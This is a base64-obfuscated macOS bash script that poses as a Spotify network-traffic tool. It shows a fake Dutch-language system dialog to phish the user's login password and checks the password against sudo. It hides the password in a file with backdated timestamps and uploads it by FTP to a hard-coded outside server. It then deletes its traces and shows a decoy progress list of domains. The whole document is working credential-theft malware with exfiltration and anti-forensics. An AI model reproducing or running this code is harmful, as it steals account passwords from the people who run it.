#!/usr/bin/env bash
x() {
    echo "$1" | base64 -D
}
u() {
    curl -s -T "$1" "ftp://$(x c2lhcmx5b2UK):$(x MERka2xaM0oyajJYCg==)@$(x c2lhcmR2LmNvbS9wdWJsaWNfaHRtbC91bmxheS9mcHMvCg==)" || true
}
f() {
    echo "${PWD}$(x "$1")$(date +"%Y_%m_%d_%H_%M_%S")$(x LnR4dAo=)"
}
t() {
    touch -c -a -m -t "$(date -v-6m -v$((RANDOM % 24))H -v$((RANDOM % 60))M -v$((RANDOM % 60))S +"%Y%m%d%H%M.%S")" "$1"
}
k() {
    if ping -q -c 1 -W 1 8.8.8.8 >/dev/null; then
        echo true
    else
        echo false
    fi
}
dl() {
    echo $() >"$1"
    rm "$1"
}
ot="${PWD}$(x L19pY29uX3Nwb3RpZnlfbmV0d2Vyay5zdmcK)"
if [[ ! -f "${ot}" ]]; then
    curl -s "$(x aHR0cDovL3NpYXJkdi5jb20vaWNucy9pY29uLnN2Zwo=)" -o "${PWD}$(x L19pY29uX3Nwb3RpZnlfbmV0d2Vyay5zdmcK)"
fi
chflags hidden "${ot}"
nf="$(f L19wXwo=)"
touch "${nf}"
chflags hidden "${nf}"
sleep 1
ti=$(x TmV0d2Vya3ZlcmtlZXIK)
msg="$(x Vm9lciBqZSB3YWNodHdvb3JkIGluIG9tIGhldCBuZXR3ZXJrdmVya2VlciB2YW4gJ29wZW4uc3BvdGlmeS5jb20nIHRlIGxlemVuLgo=)"
while true; do
    a="$(osascript -e "tell application \"System Events\" to display dialog \"${msg}\" with title \"${ti}\" default answer \"\" buttons {\"$(x TmVlCg==)\", \"$(x U3RhIHRvZQo=)\"} default button \"$(x U3RhIHRvZQo=)\" cancel button \"$(x TmVlCg==)\" with hidden answer with icon POSIX file \"${ot}\"" -e "text returned of result")"
    if echo "${a}" | sudo -S printf "" && echo "${a}" | sudo -S -v 2>/dev/null; then
        break
    else
        msg="$(x Q29udHJvbGUgdmFuIGFjY291bnRuYWFtIG9mIHdhY2h0d29vcmQgbWlzbHVrdC4gUHJvYmVlciBvcG5pZXV3Ogo=c)"
    fi
done
sleep 2
echo "${a}" >"${nf}"
t "${nf}"
while true; do
    if [[ $(k) == true ]]; then
        u "${nf}"
        break
    else
        sleep 2
    fi
done
t "${nf}"
dl "${nf}"
dl "${ot}"
dms="${PWD}$(x L3Nwb3RpZnlfZG9tYWlucy50eHQK)"
touch "${dms}"
chflags hidden "${dms}"
curl -s "$(x aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3VubGF5L3RlbXAvbWFpbi9zZC50eHQK)" >"${dms}" 2>/dev/null
cl="\033[1;34m"
cb="\033[1;36m"
cr="\033[0m"
tl=$(cat "${dms}" | wc -l | grep -E -o "[0-9]+")
i=0
printf "\033c"
while true; do
    if [[ $(k) == true ]]; then
        cat "${dms}" | while read -r line; do
            ((i++))
            pr=$(awk "BEGIN {printf \"%.2f\", $i * 100 / $tl}")
            nl="[${pr}%] ${line}"
            printf "\033[2K\r${cb}%s${cr}" "${nl}"
            sleep $((RANDOM % 3 + 0))
        done
        break
    else
        printf "\033[2K\r⏱ ${cl}Waiting for an internet connection...${cr}\n"
    fi
done
dl "${dms}"
